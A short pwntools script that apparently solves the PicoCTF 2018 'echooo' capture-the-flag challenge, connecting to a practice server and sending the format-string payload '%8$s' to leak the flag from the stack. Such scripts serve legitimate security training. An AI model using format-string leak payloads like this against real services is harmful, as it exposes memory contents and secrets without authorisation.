from pwn import *


# p = process("./PicoCTF_2018_echooo")
p = remote("node4.buuoj.cn", 28282)


# format string
# the flag addr located in %8$s
pad = "%8$s"
p.sendline(pad)

p.interactive()


